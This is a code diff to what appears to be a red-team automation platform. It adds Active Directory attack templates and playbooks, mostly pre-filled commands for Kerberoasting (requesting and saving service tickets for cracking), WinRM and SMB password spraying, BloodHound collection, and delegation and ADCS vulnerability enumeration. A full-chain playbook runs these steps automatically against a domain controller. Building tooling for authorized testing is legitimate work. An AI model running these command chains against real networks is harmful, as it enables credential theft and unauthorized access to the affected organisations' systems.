@@ -273,6 +273,99 @@ STEP_TEMPLATES = {
             {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
         ],
     },
+    # ── AD — new step templates ───────────────────────────────────────────────
+    "attacker_ssh:spn_enum": {
+        "id": "attacker_ssh:spn_enum",
+        "title": "SPN Enumeration (impacket)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "List all SPN accounts (Kerberoastable) without requesting tickets.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} 2>&1", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 60},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "recon"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+        ],
+    },
+    "attacker_ssh:adcs_enum": {
+        "id": "attacker_ssh:adcs_enum",
+        "title": "ADCS Enum (certipy)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Find vulnerable AD CS templates (ESC1–ESC8) via certipy-ad.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "certipy-ad find -u '{username}@{domain}' -p '{password}' -dc-ip {target} -stdout 2>&1", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "recon"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+        ],
+    },
+    "attacker_ssh:delegation_enum": {
+        "id": "attacker_ssh:delegation_enum",
+        "title": "Delegation Enum (impacket)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Find accounts with unconstrained or constrained Kerberos delegation.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "impacket-findDelegation '{domain}/{username}:{password}' -dc-ip {target} 2>&1", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 60},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "recon"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+        ],
+    },
+    "attacker_ssh:bloodhound_collect": {
+        "id": "attacker_ssh:bloodhound_collect",
+        "title": "BloodHound Collection (bloodhound-python)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Collect BloodHound data via bloodhound-python. Saves JSON files to /tmp/bh_{target}/.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "mkdir -p /tmp/bh_{target} && bloodhound-python -u '{username}' -p '{password}' -d '{domain}' -ns {target} -c All --zip -o /tmp/bh_{target}/ 2>&1 && echo 'DONE'", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 300},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "recon"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+        ],
+    },
+    "netexec:spray_winrm": {
+        "id": "netexec:spray_winrm",
+        "title": "NetExec WinRM Spray",
+        "connector_key": "netexec",
+        "operation": "scan",
+        "description": "Password spray via WinRM. Identifies hosts where the credential grants remote shell access.",
+        "fields": [
+            {"key": "target", "label": "Target", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "protocol", "label": "Protocol", "type": "select", "options": ["winrm", "smb", "mssql", "rdp"], "default": "winrm"},
+            {"key": "extra_flags", "label": "Extra flags", "type": "text", "default": "--continue-on-success --no-bruteforce"},
+            {"key": "username", "label": "Username", "type": "text", "default": ""},
+            {"key": "password", "label": "Password", "type": "text", "default": ""},
+            {"key": "domain", "label": "Domain", "type": "text", "default": ""},
+            {"key": "hash", "label": "Hash (NTLM)", "type": "text", "default": ""},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
+    "netexec:adcs_check": {
+        "id": "netexec:adcs_check",
+        "title": "NetExec ADCS Check",
+        "connector_key": "netexec",
+        "operation": "scan",
+        "description": "Check for ADCS (Certificate Services) via NetExec ldap --adcs module.",
+        "fields": [
+            {"key": "target", "label": "Target DC IP", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "protocol", "label": "Protocol", "type": "select", "options": ["ldap", "ldaps"], "default": "ldap"},
+            {"key": "extra_flags", "label": "Extra flags", "type": "text", "default": "--adcs"},
+            {"key": "username", "label": "Username", "type": "text", "default": ""},
+            {"key": "password", "label": "Password", "type": "text", "default": ""},
+            {"key": "domain", "label": "Domain", "type": "text", "default": ""},
+            {"key": "hash", "label": "Hash (NTLM)", "type": "text", "default": ""},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 60},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
 }
 
 CONDITION_OPERATORS = {"eq", "ne", "gt", "gte", "lt", "lte", "contains"}
@@ -587,6 +680,148 @@ BUILTIN_PLAYBOOKS = {
             },
             {
                 "title": "Topology auto-build",
+                "connector_key": "topology", "operation": "auto_build",
+                "params": {},
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    # ── New AD playbooks (P6) ─────────────────────────────────────────────────
+    "ad-spn-enum": {
+        "id": "ad-spn-enum",
+        "title": "AD — SPN Discovery",
+        "description": "List all Kerberoastable SPN accounts without requesting tickets. Quick recon step before deciding to Kerberoast.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "GetUserSPNs — list only",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} 2>&1",
+                    "timeout_seconds": 60, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-delegation-enum": {
+        "id": "ad-delegation-enum",
+        "title": "AD — Delegation Enumeration",
+        "description": "Find accounts and computers with unconstrained or constrained Kerberos delegation configured.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "findDelegation — unconstrained/constrained",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-findDelegation '{domain}/{username}:{password}' -dc-ip {target} 2>&1",
+                    "timeout_seconds": 60, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-adcs-enum": {
+        "id": "ad-adcs-enum",
+        "title": "AD — ADCS Vulnerability Check",
+        "description": "Enumerate Certificate Services templates for misconfigurations (ESC1–ESC8). Runs certipy-ad find against the DC.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "certipy-ad find — ESC1-ESC8",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "certipy-ad find -u '{username}@{domain}' -p '{password}' -dc-ip {target} -stdout -vulnerable 2>&1",
+                    "timeout_seconds": 120, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-spray-winrm": {
+        "id": "ad-spray-winrm",
+        "title": "AD — WinRM Spray",
+        "description": "Spray credentials via WinRM across all targets. Identifies hosts where the credential grants remote shell access (Pwn3d! = local admin).",
+        "editable": False,
+        "steps": [
+            {
+                "title": "NetExec WinRM spray",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "winrm", "extra_flags": "--continue-on-success --no-bruteforce"},
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-bloodhound": {
+        "id": "ad-bloodhound",
+        "title": "AD — BloodHound Collection",
+        "description": "Collect full BloodHound data via bloodhound-python (All collectors). Saves a ZIP to /tmp/bh_{target}/ on the attacker box.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "bloodhound-python — All collectors",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "mkdir -p /tmp/bh_{target} && bloodhound-python -u '{username}' -p '{password}' -d '{domain}' -ns {target} -c All --zip -o /tmp/bh_{target}/ 2>&1 && echo 'DONE'",
+                    "timeout_seconds": 300, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-full-enum": {
+        "id": "ad-full-enum",
+        "title": "AD — Full Enumeration Chain",
+        "description": "Comprehensive AD enumeration: port scan → LDAP users/groups → SPN list → Kerberoast → delegation check → ADCS → topology refresh.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "Nmap — DC port scan",
+                "connector_key": "nmap", "operation": "scan",
+                "params": {"flags": "-p 53,88,135,139,389,443,445,464,636,3268,3269,5985 -sV --open"},
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "NetExec LDAP — users/groups/computers/policy",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "ldap", "extra_flags": "--users --groups --computers --password-not-required --admin-count --trusted-for-delegation --pass-pol"},
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "NetExec LDAP — ADCS check",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "ldap", "extra_flags": "--adcs"},
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "SPN discovery — Kerberoastable accounts",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} 2>&1",
+                    "timeout_seconds": 60, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "Kerberoast — request TGS tickets",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast_{target}.txt 2>&1 && echo 'DONE'",
+                    "timeout_seconds": 120, "activity_type": "kerberoast", "execution_mode": "auto",
+                },
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "Delegation enumeration",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-findDelegation '{domain}/{username}:{password}' -dc-ip {target} 2>&1",
+                    "timeout_seconds": 60, "activity_type": "recon", "execution_mode": "auto",
+                },
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "Topology refresh",
                 "connector_key": "topology", "operation": "auto_build",
                 "params": {},
                 "on_success": "stop", "on_failure": "stop",
